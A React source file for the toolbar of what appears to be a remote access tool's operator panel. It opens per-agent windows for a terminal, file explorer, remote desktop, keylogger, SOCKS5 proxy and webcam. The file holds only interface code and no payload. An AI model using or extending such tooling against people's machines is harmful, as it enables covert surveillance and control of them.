import { useState, useEffect, useRef } from "react";
import { useAltTab } from "../../hooks/useAltTab";
import { on } from "../../socket/events";
import { send } from "../../socket";
import WindowSwitcher from "../ui/WindowSwitcher";
import Window from "../ui/Window";
import { getAppState, setAppState } from "../../appstate";
import Terminal from "./Terminal";
import SystemInfo from "./SystemInfo";
import ProcessManager from "./ProcessManager";
import FileExplorer from "./FileExplorer";
import RemoteDesktop from "./RemoteDesktop";
import Webcam from "./Webcam";
import { CmdIcon, TaskMgrIcon, LiveViewIcon, FileExplorerIcon, LogsIcon, LatencyIcon, SystemIcon, KeylogIcon, Socks5Icon, WebcamIcon } from "../icons";
import Logs from "./Logs";
import Latency from "./Latency";
import Keylogger from "./Keylogger";
import Socks5 from "./Socks5";

const APP_REGISTRY = {
  terminal:     { Icon: CmdIcon,          title: "Terminal",      size: { w: 640, h: 440 }, bodyClassName: "",   render: (agent, tab) => <div className="h-full"><Terminal agent={agent} activeTab={tab} /></div> },
  taskmgr:      { Icon: TaskMgrIcon,      title: "Task Manager",  size: { w: 520, h: 510 }, bodyClassName: "",   render: (agent) => <div className="h-full"><ProcessManager agent={agent} /></div> },
  fileexplorer: { Icon: FileExplorerIcon, title: "File Explorer", size: { w: 700, h: 520 }, bodyClassName: "p-0",render: (agent) => <div className="h-full"><FileExplorer agent={agent} /></div> },
  logs:         { Icon: LogsIcon,     title: "Logs",          size: { w: 680, h: 420 }, bodyClassName: "p-0",render: (agent) => <div className="h-full"><Logs agent={agent} /></div> },
  remotedesktop:{ Icon: LiveViewIcon, title: "Remote Desktop",size: { w: 1100, h: 720 }, bodyClassName: "p-0",render: (agent) => <div className="h-full relative"><RemoteDesktop agent={agent} /></div> },
  system:       { Icon: SystemIcon,       title: "System",        size: { w: 420, h: 540 }, bodyClassName: "p-0",render: (agent, tab) => <div className="h-full"><SystemInfo agent={agent} activeTab={tab} /></div> },
  latency:      { Icon: LatencyIcon,      title: "Latency",       size: { w: 640, h: 360 }, bodyClassName: "p-0",render: (agent) => <div className="h-full"><Latency agent={agent} /></div> },
  keylog:       { Icon: KeylogIcon,       title: "Keylogger",     size: { w: 640, h: 480 }, bodyClassName: "p-0",render: (agent) => <div className="h-full"><Keylogger agent={agent} /></div> },
  socks5:       { Icon: Socks5Icon,       title: "SOCKS5",        size: { w: 480, h: 320 }, bodyClassName: "p-0",render: (agent) => <div className="h-full"><Socks5 agent={agent} /></div> },
  webcam:       { Icon: WebcamIcon,       title: "Webcam",        size: { w: 640, h: 520 }, bodyClassName: "p-0",render: (agent) => <div className="h-full"><Webcam agent={agent} /></div> },
};

export default function Toolbar({ agent }) {
  const [appIds, setAppIds] = useState([]);
  const [open, setOpen] = useState({});
  const [mounted, setMounted] = useState({});
  const [appTabs, setAppTabs] = useState({});
  const [activeTab, setActiveTab] = useState({});
  const focusRefs = useRef({});

  const openIds = appIds.filter((id) => open[id]);
  const { visible: switcherVisible, index: switcherIndex } = useAltTab(openIds);

  useEffect(() => {
    if (!switcherVisible && openIds.length > 0) {
      const targetId = openIds[switcherIndex] ?? openIds[0];
      focusRefs.current[targetId]?.bringToFront();
    }
  }, [switcherVisible, switcherIndex]);

  useEffect(() => {
    const unApps = on("panel_apps", (p) => {
      if (!p || String(p.agent_id) !== String(agent.id)) return;
      const ids = Array.isArray(p.apps) ? p.apps.filter((id) => id in APP_REGISTRY) : [];
      setAppIds(ids);
    });
    const unTabs = on("panel_tabs", (p) => {
      if (!p || String(p.agent_id) !== String(agent.id)) return;
      const tabs = Array.isArray(p.tabs) ? p.tabs.slice(0, 8) : [];
      setAppTabs((prev) => ({ ...prev, [p.app_id]: tabs }));
      setActiveTab((prev) => ({ ...prev, [p.app_id]: prev[p.app_id] || tabs[0]?.id }));
    });
    send("panel_apps_get", { agent_id: String(agent.id) });
    return () => { unApps(); unTabs(); };
  }, [agent.id]);

  if (!agent) return null;

  const toggle = (id) => {
    if (open[id]) {
      setOpen((o) => ({ ...o, [id]: false }));
      setMounted((m) => ({ ...m, [id]: false }));
    } else {
      setMounted((m) => ({ ...m, [id]: true }));
      setOpen((o) => ({ ...o, [id]: true }));
      if (!appTabs[id]) {
        send("panel_tabs_get", { agent_id: String(agent.id), app_id: id });
      }
    }
  };

  const apps = appIds.map((id) => ({ id, ...APP_REGISTRY[id] }));

  return (
    <>
      <div
        className="flex items-center px-2 border-b overflow-x-auto"
        style={{
          background: "var(--window-face)",
          borderColor: "color-mix(in srgb, var(--text) 10%, transparent)",
          scrollbarWidth: "none",
          height: 44,
          flexShrink: 0,
          gap: 1,
        }}
      >
        {apps.map(({ id, Icon }) => {
          const isOpen = open[id];
          return (
            <button
              key={id}
              title={APP_REGISTRY[id]?.title}
              onClick={() => toggle(id)}
              className="flex items-center gap-1.5 flex-shrink-0 rounded-md px-2.5"
              style={{
                height: 32,
                minWidth: 0,
                background: isOpen ? "color-mix(in srgb, var(--accent) 14%, transparent)" : "transparent",
                border: "1px solid",
                borderColor: isOpen ? "color-mix(in srgb, var(--accent) 40%, transparent)" : "transparent",
                color: isOpen ? "var(--accent)" : "var(--muted)",
                cursor: "pointer",
                transition: "background 0.1s, border-color 0.1s, color 0.1s",
                fontSize: 12,
                fontWeight: 500,
                whiteSpace: "nowrap",
              }}
              onMouseEnter={(e) => { if (!isOpen) { e.currentTarget.style.background = "color-mix(in srgb, var(--text) 7%, transparent)"; e.currentTarget.style.color = "var(--sidebar-text)"; } }}
              onMouseLeave={(e) => { if (!isOpen) { e.currentTarget.style.background = "transparent"; e.currentTarget.style.color = "var(--muted)"; } }}
            >
              <Icon className="w-3.5 h-3.5 flex-shrink-0" />
              <span>{APP_REGISTRY[id]?.title}</span>
            </button>
          );
        })}
      </div>
      {apps.map(({ id, size, bodyClassName, render }) => {
        if (!mounted[id]) return null;
        const saved = getAppState(agent.id, id);
        const tabs = appTabs[id];
        const curTab = activeTab[id];
        return (
          <Window
            key={id}
            title={`${agent.name} — ${APP_REGISTRY[id]?.title}`}
            draggable
            resizable
            pos={saved.pos}
            size={saved.size || size}
            onLayoutChange={(l) => setAppState(agent.id, id, l)}
            ref={(el) => { focusRefs.current[id] = el; }}
            onClose={() => { setOpen((o) => ({ ...o, [id]: false })); setMounted((m) => ({ ...m, [id]: false })); }}
            bodyClassName={bodyClassName}
            className="win-swish"
            tabs={tabs}
            activeTab={curTab}
            onTabChange={(tabId) => {
              setActiveTab((prev) => ({ ...prev, [id]: tabId }));
              send("panel_tab_action", { agent_id: String(agent.id), app_id: id, tab_id: tabId });
            }}
          >
            {render(agent, curTab)}
          </Window>
        );
      })}
      {switcherVisible && (
        <WindowSwitcher apps={apps} openIds={openIds} index={switcherIndex} />
      )}
    </>
  );
}